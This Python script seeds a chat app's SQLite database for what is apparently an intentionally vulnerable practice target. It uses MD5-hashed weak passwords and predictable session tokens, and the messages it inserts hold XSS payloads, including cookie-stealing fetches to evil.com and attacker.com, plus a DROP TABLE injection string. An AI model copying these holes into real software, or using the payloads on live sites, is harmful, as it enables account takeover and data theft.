"""
Database Seeding Script
Populates the database with initial test data
"""

import sqlite3
import hashlib
from datetime import datetime, timedelta
import random

def seed_database():
    """Seed the database with test data"""

    conn = sqlite3.connect('chatapp.db')
    cursor = conn.cursor()

    print("Seeding database...")

    # Create tables
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            email TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            role TEXT DEFAULT 'user'
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            from_user TEXT NOT NULL,
            to_user TEXT NOT NULL,
            content TEXT NOT NULL,
            sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            read INTEGER DEFAULT 0
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            token TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            expires_at TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id)
        )
    ''')

    # Weak password users - using MD5 hashing
    users = [
        ('admin', 'admin123', 'admin@chatapp.local', 'admin'),
        ('testuser', 'password', 'test@chatapp.local', 'user'),
        ('john_doe', '12345', 'john@example.com', 'user'),
        ('alice', 'password123', 'alice@example.com', 'user'),
        ('bob', 'qwerty', 'bob@example.com', 'user'),
        ('charlie', 'letmein', 'charlie@example.com', 'user'),
        ('david', 'admin', 'david@example.com', 'user'),
        ('eve', '123456', 'eve@example.com', 'user'),
        ('frank', 'password1', 'frank@example.com', 'user'),
        ('grace', 'welcome', 'grace@example.com', 'user'),
        ('henry', 'abc123', 'henry@example.com', 'user'),
        ('ivy', 'password!', 'ivy@example.com', 'user'),
        ('support', 'Support2024!', 'support@chatapp.local', 'admin'),
        ('moderator', 'Mod123', 'mod@chatapp.local', 'moderator'),
        ('guest', 'guest', 'guest@chatapp.local', 'guest'),
    ]

    for username, password, email, role in users:
        try:
            # Using MD5 for password hashing (intentionally weak)
            password_hash = hashlib.md5(password.encode()).hexdigest()

            cursor.execute(
                "INSERT INTO users (username, password_hash, email, role) VALUES (?, ?, ?, ?)",
                (username, password_hash, email, role)
            )
            print(f"Added user: {username} (password: {password})")
        except sqlite3.IntegrityError:
            print(f"User {username} already exists")

    # Add some sample messages with potential XSS payloads
    messages = [
        ('alice', 'bob', 'Hey Bob, how are you?'),
        ('bob', 'alice', 'I\'m good! How about you?'),
        ('john_doe', 'alice', 'Check out this cool link: <a href="http://evil.com">Click here</a>'),
        ('charlie', 'david', '<script>alert("XSS")</script>'),
        ('eve', 'admin', 'Hi admin, I need help with my account'),
        ('frank', 'grace', '<img src=x onerror="alert(\'XSS\')">'),
        ('henry', 'ivy', 'Did you see the latest update?'),
        ('alice', 'john_doe', 'Thanks for the message!'),
        ('support', 'eve', 'How can we help you today?'),
        ('moderator', 'charlie', 'Please follow the community guidelines'),
        ('bob', 'frank', '<iframe src="http://malicious.com"></iframe>'),
        ('grace', 'henry', 'Let\'s meet tomorrow'),
        ('ivy', 'bob', '<svg onload=alert("XSS")>'),
        ('david', 'eve', 'Sure, I can help with that'),
        ('admin', 'support', 'Please review the new user reports'),
        ('testuser', 'admin', '<img src="" onerror="fetch(\'http://evil.com/steal?cookie=\'+document.cookie)">'),
        ('john_doe', 'testuser', '"><script>document.location="http://attacker.com/steal.php?c="+document.cookie</script>'),
        ('alice', 'charlie', '\'; DROP TABLE users; --'),
        ('bob', 'david', '<body onload=alert(\'XSS\')>'),
        ('charlie', 'alice', '<input onfocus=alert("XSS") autofocus>'),
    ]

    for from_user, to_user, content in messages:
        try:
            timestamp = datetime.now() - timedelta(days=random.randint(0, 7), hours=random.randint(0, 23))
            cursor.execute(
                "INSERT INTO messages (from_user, to_user, content, sent_at) VALUES (?, ?, ?, ?)",
                (from_user, to_user, content, timestamp.isoformat())
            )
        except Exception as e:
            print(f"Error adding message: {e}")

    # Add some sessions with predictable tokens
    sessions_data = [
        (1, 'admin_session_token_12345'),
        (2, 'user_session_token_67890'),
        (3, 'john_session_abc123'),
    ]

    for user_id, token in sessions_data:
        try:
            expires = datetime.now() + timedelta(days=7)
            cursor.execute(
                "INSERT INTO sessions (user_id, token, expires_at) VALUES (?, ?, ?)",
                (user_id, token, expires.isoformat())
            )
        except sqlite3.IntegrityError:
            print(f"Session token already exists")

    conn.commit()
    conn.close()

    print("\nDatabase seeded successfully!")
    print("\n=== TEST CREDENTIALS ===")
    print("Admin user: admin / admin123")
    print("Test user: testuser / password")
    print("Other users: john_doe/12345, alice/password123, bob/qwerty")
    print("\nAdmin session token: admin_session_token_12345")
    print("\n=== VULNERABILITIES ADDED ===")
    print("- Weak passwords (common passwords, short passwords)")
    print("- MD5 password hashing (weak hashing algorithm)")
    print("- XSS payloads in messages")
    print("- SQL injection attempts in messages")
    print("- Predictable session tokens")


if __name__ == '__main__':
    seed_database()
